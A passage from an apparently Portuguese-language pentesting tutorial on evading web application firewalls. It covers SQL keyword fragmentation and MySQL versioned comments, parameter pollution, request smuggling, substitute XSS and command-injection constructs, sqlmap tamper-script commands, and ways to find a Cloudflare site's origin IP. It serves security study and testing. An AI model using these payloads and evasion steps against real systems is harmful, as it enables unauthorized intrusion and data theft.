> **Princípio:** WAFs buscam por palavras-chave inteiras como `UNION`, `SELECT`, `<script>`. Se você **fragmentar** a palavra-chave, o regex do WAF não faz match, mas a tecnologia de destino reconstrói a palavra.

**Comentários inline (SQL):** Inserir `/**/` no meio da keyword.
```sql
UN/**/ION SEL/**/ECT 1,2,3--
-- O MySQL ignora /**/ e lê: UNION SELECT 1,2,3
-- O WAF vê: "UN", "ION", "SEL", "ECT" → sem match de regex
```

**Case variation:** Alternar maiúsculas e minúsculas. SQL é case-insensitive para keywords.
```sql
uNiOn SeLeCt 1,2,3--
```

**Double keyword (anti-remoção):** Se o WAF **remove** a palavra `UNION` do payload ao invés de bloquear, você pode aninhar:
```sql
UNUNIONION SESELECTLECT 1,2,3--
-- O WAF remove UNION e SELECT do meio → resultado: UNION SELECT 1,2,3
```

**Versioned comments (MySQL):** Um recurso do MySQL que poucas pessoas conhecem. Comentários com `/*!` são **executados** se a versão do MySQL for maior ou igual ao número indicado.
```sql
/*!50000UNION*//*!50000SELECT*/1,2,3--
-- MySQL >= 5.0.0 executa o conteúdo dentro do comentário
-- Para o WAF, é "só um comentário"
```

> **Essa é uma das técnicas mais poderosas contra WAFs baseados em regex.** O WAF e o MySQL interpretam o comentário de formas completamente opostas.

---

##### Camada 4: Manipulação do Protocolo HTTP — Atacar o transporte, não a carga

> **Princípio:** O WAF analisa a requisição HTTP de uma certa forma. Se você mudar **como** a requisição é enviada (não apenas o conteúdo), pode enganar o parser.

**Trocar método HTTP:**
- Alguns WAFs só inspecionam GET. Trocar para POST pode fazer o payload passar.
- Outros só inspecionam `application/x-www-form-urlencoded`. Trocar o `Content-Type` para `application/json` ou `multipart/form-data` pode bypassar.

**HTTP Parameter Pollution (HPP):**
- Enviar o **mesmo parâmetro** duas vezes. Cada tecnologia trata isso de forma diferente:
  - **PHP/Apache:** usa o **último** valor
  - **IIS/ASP:** **concatena** os valores
  - **JSP/Tomcat:** usa o **primeiro** valor
- O WAF pode analisar um, mas a aplicação usa outro!

```
?id=1&id=' UNION SELECT 1,2,3--
-- Se o WAF analisa o primeiro (1) e a aplicação usa o segundo → bypass!
```

**Chunked Transfer Encoding:**
- Dividir o body da requisição em "pedaços" (chunks) menores. O WAF pode não conseguir remontar o payload completo antes de analisar.

**Header Injection para whitelist falsa:**
- Alguns WAFs confiam em IPs "internos". Adicionar headers como `X-Forwarded-For: 127.0.0.1` pode fazer o WAF pensar que a requisição vem de dentro da rede.

> **Em hacking:** Essa é a camada que separa script kiddies de pentesters. Não é sobre o payload em si — é sobre como você **entrega** o payload. A maioria dos WAFs é excelente em inspecionar conteúdo, mas muito fraca em validar a integridade do protocolo HTTP.

---

##### Camada 5: Funções e Construções Alternativas — Dizer a mesma coisa de outra forma

> **Princípio:** Se o WAF bloqueia uma função SQL/JS específica, use outra que faz exatamente a mesma coisa mas não está na blacklist.

**SQL — Funções equivalentes:**

| Bloqueado | Alternativa | Faz a mesma coisa |
|---|---|---|
| `SUBSTRING(x,1,1)` | `MID(x,1,1)` ou `LEFT(x,1)` ou `RIGHT(x,1)` | Extrai caracteres |
| `SLEEP(5)` | `BENCHMARK(10000000, SHA1('x'))` | Causa delay |
| `database()` | `schema_name FROM information_schema.schemata` | Nome do banco |
| `@@version` | `@@global.version` ou `version/*!()*/` | Versão do MySQL |
| `information_schema.tables` | `mysql.innodb_table_stats` (MySQL ≥ 5.7) | Nomes de tabelas |
| `CONCAT('a','b')` | `'a' 'b'` (justaposição) ou `CONCAT_WS('','a','b')` | Concatenação |
| `extractvalue()` | `GTID_SUBSET()` ou `JSON_KEYS()` | Error-based extraction |

**XSS — Bypass sem `alert()`:**

| Bloqueado | Alternativa |
|---|---|
| `alert()` | `prompt()`, `confirm()`, `print()` |
| `alert(1)` | `alert\`1\`` (template literals, sem parênteses) |
| `<script>` | `<svg onload=...>`, `<img onerror=...>`, `<details ontoggle=...>` |
| Evento `onerror` | `onfocus`, `onanimationstart`, `onpointerover`, `ontouchstart` |
| `eval()` | `Function('...')()`, `setTimeout('...')`, `[].constructor.constructor('...')()` |

**Command Injection — Bypass de comando bloqueado:**

| Bloqueado | Alternativa |
|---|---|
| `cat` | `tac`, `nl`, `head`, `tail`, `less`, `more`, `sed '' arquivo`, `awk '{print}'` |
| Espaço | `$IFS` (Internal Field Separator), `{cmd,arg}` (brace expansion), `%09` (TAB) |
| `/` (barra) | `${HOME:0:1}` (extrai primeiro char de `/home/user` = `/`) |

> **Analogia:** Se o segurança não deixa entrar quem pede "cerveja", peça "uma loira gelada". O bartender entende perfeitamente.

---

##### Camada 6: Request Smuggling — Hackear o próprio transportador

> **O que é:** A técnica mais avançada de WAF bypass. Explora inconsistências entre **como o WAF/proxy** e **como o backend** interpretam onde uma requisição HTTP termina e a próxima começa.

**Como funciona:**
- Uma requisição HTTP tem dois ways de definir o tamanho do body: `Content-Length` e `Transfer-Encoding: chunked`.
- Se o WAF usa `Content-Length` para delimitar a requisição, mas o backend usa `Transfer-Encoding` (ou vice-versa), você pode **contrabandear** uma segunda requisição "escondida" dentro da primeira.
- O WAF analisa apenas a requisição "visível" e ignora a payload contrabandeada.

**Variantes:**
- **CL.TE** — WAF confia no Content-Length, backend confia no Transfer-Encoding
- **TE.CL** — WAF confia no Transfer-Encoding, backend confia no Content-Length
- **TE.TE** — Ambos suportam TE, mas um pode ser confundido com variações sutis do header

> **Quando usar:** Último recurso. É complexo de explorar e depende da infraestrutura específica (reverse proxy, load balancer). Mas quando funciona, bypassa **qualquer** WAF porque o payload literalmente não é analisado.

> **Ferramenta:** O Burp Suite tem um scanner dedicado de HTTP Request Smuggling.

---

#### SQLMap Tamper Scripts — Automação de WAF Bypass

> **O que são:** Tamper scripts são **plugins do SQLMap** que transformam os payloads antes de enviá-los, aplicando técnicas de ofuscação automaticamente. Em vez de fazer bypass manual, o SQLMap aplica as transformações para você.

**Como funciona:** O SQLMap gera o payload de SQLi, depois passa pelo tamper script que modifica o payload (troca espaços por comentários, randomiza case, aplica encoding), e então envia a versão modificada.

**Exemplo prático — O problema e a solução:**
```bash
# Sem tamper: o SQLMap envia "' UNION SELECT 1,2,3--" e o WAF bloqueia
sqlmap -u "http://alvo.com/page?id=1"

# Com tamper: o SQLMap envia "'/**/uNiOn/**/SeLeCt/**/1,2,3--" → passa pelo WAF
sqlmap -u "http://alvo.com/page?id=1" --tamper=space2comment,randomcase
```

**Os tampers mais importantes (e por que cada um existe):**

| Tamper | O que faz | Quando usar |
|---|---|---|
| `space2comment` | Espaço → `/**/` | WAF filtra espaço entre keywords SQL |
| `randomcase` | Keywords em case aleatório | WAF usa regex case-sensitive |
| `between` | `>` → `NOT BETWEEN 0 AND` | WAF filtra operadores de comparação |
| `charencode` | URL-encode todos os chars | WAF analisa payload em texto puro |
| `chardoubleencode` | Double URL encoding | WAF decodifica apenas uma vez |
| `modsecurityversioned` | Wrapa keywords em `/*!version*/` | Contra ModSecurity/OWASP CRS |
| `equaltolike` | `=` → `LIKE` | WAF filtra sinal de igual |
| `percentage` | Insere `%` entre letras | Contra IIS/ASP |
| `commalesslimit` | `LIMIT x,y` → `LIMIT y OFFSET x` | WAF detecta vírgula em LIMIT |
| `space2hash` | Espaço → `#\n` (MySQL) | Alternativa ao comentário |
| `symboliclogical` | `AND`/`OR` → `&&`/`\|\|` | WAF filtra palavras lógicas |

**Combinações testadas por tipo de WAF:**
```bash
# ModSecurity → versioned comments + case variation
sqlmap -u URL --tamper=modsecurityversioned,space2comment,randomcase

# Cloudflare → encoding + case variation
sqlmap -u URL --tamper=charencode,space2comment,randomcase --random-agent

# Genérico (primeira tentativa)
sqlmap -u URL --tamper=space2comment,randomcase --random-agent --delay=1
```

**Flags complementares essenciais:**
| Flag | O que faz | Por que usar |
|---|---|---|
| `--random-agent` | User-Agent aleatório a cada request | WAFs identificam ferramentas pelo UA |
| `--delay=N` | Delay de N segundos entre requests | Evitar rate limiting e detecção por volume |
| `-v 3` | Mostra os payloads exatos enviados | Debug — ver o que o tamper está gerando |
| `--hpp` | HTTP Parameter Pollution | Explora diferenças de parsing de parâmetros |
| `--chunked` | Envia payload em chunks | Fragmenta para confundir inspeção |
| `--technique=BEUST` | Testa tudo: Boolean, Error, Union, Stacked, Time | Maximiza chances quando o WAF filtra uma técnica |
| `--prefix`/`--suffix` | Customiza delimitadores do payload | Adaptar para contextos específicos de injeção |

> **Em hacking:** O SQLMap sem tampers contra um WAF é inútil — ele vai ser bloqueado em 100% dos requests. Tampers são **obrigatórios** em qualquer alvo com proteção. Comece com `space2comment` + `randomcase` + `--random-agent`. Se não funcionar, vá adicionando tampers e aumente o `--delay`. Se nenhuma combinação funcionar, volte para exploração manual — às vezes o SQLMap não encontra o bypass, mas seu cérebro sim.

---

#### A Mentalidade do WAF Bypass — Resumo

> O WAF bypass não é uma lista de truques. É um **jogo de interpretação**: você precisa entender como o WAF lê a requisição, como a aplicação lê a requisição, e encontrar a representação que é inofensiva para um e perigosa para o outro.

**O fluxo de pensamento:**
```
1. DETECTAR → Existe WAF? Qual?
2. ENTENDER → O que ele filtra? Keywords? Encoding? Padrões?
3. DIFERENÇAS → O que o WAF NÃO entende que o backend ENTENDE?
4. TESTAR → Começar simples (encoding), escalar (fragmentação → protocolo → smuggling)
5. ADAPTAR → Cada WAF é diferente. O que bypassa Cloudflare pode não bypassar ModSecurity.
```

**Regras de ouro:**
- **Nunca teste bypass às cegas.** Identifique o WAF primeiro.
- **Comece pelo encoding mais simples.** Muitos WAFs são mais fracos do que parecem.
- **Observe a resposta com atenção.** A mensagem de erro do WAF muitas vezes revela qual regra foi ativada.
- **Se o WAF remove ao invés de bloquear** → use double keyword (UNUNIONION).
- **Se o WAF bloqueia ao invés de remover** → use encoding/fragmentação.
- **WAFs em cloud (Cloudflare, AWS WAF) podem ser bypassados encontrando o IP real** do servidor (via histórico DNS, subdomain scan, Censys/Shodan). Se você enviar a requisição diretamente para o IP do backend, o WAF é completamente irrelevante.

> **Dica avançada:** Para Cloudflare especificamente, procure o IP real do servidor em registros DNS históricos (SecurityTrails, ViewDNS.info), em emails enviados pelo site (o header do email pode revelar o IP), ou em subdomínios que não estão protegidos pelo Cloudflare. Se achar o IP real, adicione ao `/etc/hosts` apontando o domínio para ele, e todas as requisições vão direto ao backend sem WAF.